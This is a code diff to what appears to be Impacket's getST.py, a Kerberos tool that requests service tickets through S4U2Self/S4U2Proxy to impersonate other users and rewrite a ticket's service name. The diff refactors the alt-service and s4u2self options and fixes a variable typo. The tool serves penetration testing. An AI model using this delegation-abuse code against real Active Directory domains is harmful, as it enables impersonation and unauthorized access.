@@ -79,58 +79,16 @@ class GETST:
         self.__force_forwardable = options.force_forwardable
         self.__additional_ticket = options.additional_ticket
         self.__saveFileName = None
-        self.__no_s4u2proxy = options.no_s4u2proxy
-        self.__alt_service = options.altservice
         if options.hashes is not None:
             self.__lmhash, self.__nthash = options.hashes.split(':')
 
-    def saveTicket(self, ticket, sessionKey):
+    def saveTicket(self, ticket, sessionKey, alt_service=None):
         logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
         ccache = CCache()
 
-        ccache.fromTGS(ticket, sessionKey, sessionKey)
-        if self.__alt_service != None:
-            self.substitute_sname(ccache)
+        ccache.fromTGS(ticket, sessionKey, sessionKey, alt_service)
         ccache.saveFile(self.__saveFileName + '.ccache')
 
-    def substitute_sname(self, ccache):
-        cred_number = 0
-        logging.info('Number of credentials in cache: %d' % len(ccache.credentials))
-        if cred_number > 1:
-            logging.debug("More than one credentials in cache, modifying all of them")
-        for creds in ccache.credentials:
-            sname = creds['server'].prettyPrint()
-            if len(sname.split(b'@')[0].split(b'/')) == 2:
-                hostname = sname.split(b'@')[0].split(b'/')[1].decode('utf-8')
-            else:
-                hostname = sname.split(b'@')[0].decode('utf-8')
-            service_realm = sname.split(b'@')[1].decode('utf-8')
-            if '@' in self.__alt_service:
-                new_service_realm = self.__alt_service.split('@')[1].upper()
-                if not '.' in new_service_realm:
-                    logging.debug("New service realm is not FQDN, you may encounter errors")
-                if '/' in self.__alt_service:
-                    new_hostname = self.__alt_service.split('@')[0].split('/')[1]
-                    new_service_class = self.__alt_service.split('@')[0].split('/')[0]
-                else:
-                    logging.debug("No service hostname in new SPN, using the current one (%s)" % hostname)
-                    new_hostname = hostname
-                    new_service_class = self.__alt_service.split('@')[0]
-            else:
-                logging.debug("No service realm in new SPN, using the current one (%s)" % service_realm)
-                new_service_realm = service_realm
-                if '/' in self.__alt_service:
-                    new_hostname = self.__alt_service.split('/')[1]
-                    new_service_class = self.__alt_service.split('/')[0]
-                else:
-                    logging.debug("No service hostname in new SPN, using the current one (%s)" % hostname)
-                    new_hostname = hostname
-                    new_service_class = self.__alt_service
-            new_sname = "%s/%s@%s" % (new_service_class, new_hostname, new_service_realm)
-            logging.info('Changing sname from %s to %s' % (sname.decode("utf-8"), new_sname))
-            creds['server'].fromPrincipal(Principal(new_sname, type=constants.PrincipalNameType.NT_PRINCIPAL.value))
-        logging.info('Saving ticket in %s.ccache' % new_sname.replace("/", "_"))
-        ccache.saveFile(new_sname.replace("/", "_") + '.ccache')
     def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):
         if not os.path.isfile(additional_ticket_path):
             logging.error("Ticket %s doesn't exist" % additional_ticket_path)
@@ -338,7 +296,7 @@ class GETST:
 
             return r, cipher, sessionKey, newSessionKey
 
-    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
+    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, s4u2self=False, alt_service=None):
         decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
         # Extract the ticket from the TGT
         ticket = Ticket()
@@ -444,6 +402,7 @@ class GETST:
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
         serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)
+
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
         reqBody['realm'] = str(decodedTGT['crealm'])
 
@@ -462,8 +421,8 @@ class GETST:
         message = encoder.encode(tgsReq)
 
         r = sendReceive(message, self.__domain, kdcHost)
-        if self.__no_s4u2proxy:
-            return r, cipher, sessionKey, sessionKey
+        if s4u2self:
+            return r, cipher, oldSessionKey, sessionKey
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
         if logging.getLogger().level == logging.DEBUG:
@@ -665,7 +624,6 @@ class GETST:
         tgt = None
         try:
             ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
-            #ccache = CCache.loadFile(r'C:\Users\x\WIn-PADVTVG8OT8.ccache')
             logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
             principal = 'krbtgt/%s@%s' % (self.__domain.upper(), self.__domain.upper())
             creds = ccache.getCredential(principal)
@@ -706,7 +664,7 @@ class GETST:
                     tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
                                                                                                   self.__kdcHost, self.__additional_ticket)
                 else:
-                    tgs, cipher, oldSessionKey, sessioKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
+                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, options.s4u2self, options.alt_service)
             except Exception as e:
                 logging.debug("Exception", exc_info=True)
                 logging.error(str(e))
@@ -718,7 +676,7 @@ class GETST:
                 return
             self.__saveFileName = self.__options.impersonate
 
-        self.saveTicket(tgs, oldSessionKey)
+        self.saveTicket(tgs, oldSessionKey, options.alt_service)
 
 
 if __name__ == '__main__':
@@ -727,14 +685,14 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="Given a password, hash or aesKey, it will request a "
                                                                 "Service Ticket and save it as ccache")
     parser.add_argument('identity', action='store', help='[domain/]username[:password]')
-    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the '
-                                                     'service ticket will' ' be generated for')
+    parser.add_argument('-spn', action="store", required=True, help='SPN (service/server) of the target service the '
+                                                                    'service ticket will' ' be generated for')
     parser.add_argument('-impersonate', action="store", help='target username that will be impersonated (thru S4U2Self)'
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
                                                              'delegation to the SPN specified')
-    parser.add_argument('-altservice', action="store", help='SPN (service/server) you want to change the TGS ticket to')
-    parser.add_argument('-self', dest='no_s4u2proxy', action='store_true', help='Only do S4U2self, no S4U2proxy')
+    parser.add_argument('-alt-service', action="store", help='change the service ticket\'s sname')
+    parser.add_argument('-s4u2self', action="store_true", help='only do s4u2self request')
     parser.add_argument('-additional-ticket', action='store', metavar='ticket.ccache', help='include a forwardable service ticket in a S4U2Proxy request for RBCD + KCD Kerberos only')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -773,10 +731,9 @@ if __name__ == '__main__':
         logging.debug(version.getInstallationPath())
     else:
         logging.getLogger().setLevel(logging.INFO)
-    if options.altservice != None and len(options.altservice.split('/')) != 2:
-        parser.error('argument -altservice should be specified as service/server format')
-    if not options.no_s4u2proxy and options.spn is None:
-        parser.error("argument -spn is required, except when -self is set")
+    if options.alt_service != None and len(options.alt_service.split('/')) != 2:
+        logging.critical('alt-service should be specified as service/host format')
+        sys.exit(1)
     domain, username, password = parse_credentials(options.identity)
 
     try:
